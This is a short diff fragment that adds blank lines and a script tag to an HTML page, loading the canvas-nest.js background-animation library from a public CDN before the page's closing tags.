+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
